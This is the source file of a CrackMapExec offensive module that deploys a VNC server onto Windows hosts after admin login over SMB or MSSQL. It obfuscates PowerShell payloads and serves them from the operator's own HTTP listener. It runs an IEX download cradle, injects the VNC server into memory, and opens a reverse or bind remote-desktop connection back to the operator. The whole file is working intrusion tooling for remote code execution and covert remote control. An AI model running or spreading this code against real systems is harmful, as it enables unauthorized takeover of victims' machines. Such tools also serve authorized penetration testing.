from cme.helpers.powershell import *

class CMEModule:
    '''
        Executes Invoke-VNC
        Module by @byt3bl33d3r
    '''

    name = 'invoke_vnc'
    description = "Injects a VNC client in memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        CONTYPE   Specifies the VNC connection type, choices are: reverse, bind (default: reverse).
        PORT      VNC Port (default: 5900)
        PASSWORD  Specifies the connection password.
        '''

        self.contype = 'reverse'
        self.port = 5900
        self.password = None

        if 'PASSWORD' not in module_options:
            context.log.error('PASSWORD option is required!')
            exit(1)

        if 'CONTYPE' in module_options:
            self.contype    =  module_options['CONTYPE']

        if 'PORT' in module_options:
            self.port = int(module_options['PORT'])

        self.password = module_options['PASSWORD']

        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('invoke-vnc/Invoke-Vnc.ps1')

    def on_admin_login(self, context, connection):
        if self.contype == 'reverse':
            command = 'Invoke-Vnc -ConType reverse -IpAddress {} -Port {} -Password {}'.format(context.localip, self.port, self.password)
        elif self.contype == 'bind':
            command = 'Invoke-Vnc -ConType bind -Port {} -Password {}'.format(self.port, self.password)

        vnc_command = gen_ps_iex_cradle(context, 'Invoke-Vnc.ps1', command, post_back=False)

        launcher = gen_ps_inject(vnc_command, context)

        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'Invoke-Vnc.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

            request.stop_tracking_host()

        else:
            request.send_response(404)
            request.end_headers()
